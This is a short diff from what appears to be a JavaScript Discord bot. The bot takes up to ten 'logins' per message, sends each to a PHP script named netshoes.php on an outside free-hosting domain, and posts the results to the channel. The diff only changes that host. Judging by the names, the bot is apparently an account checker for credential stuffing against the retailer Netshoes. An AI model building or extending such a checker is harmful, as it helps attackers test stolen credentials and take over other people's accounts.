@@ -84,7 +84,7 @@ if(dados.length > 10){
 return message.reply("10 logins por vez.");
 }
         dados.forEach(function (value) {
-      Request("http://potential-winch.000webhostapp.com/netshoes.php?dados=" + value, function(result) {
+      Request("http://thelimao.kinghost.net/netshoes.php?dados=" + value, function(result) {
             message.channel.send(result);
       });
         });
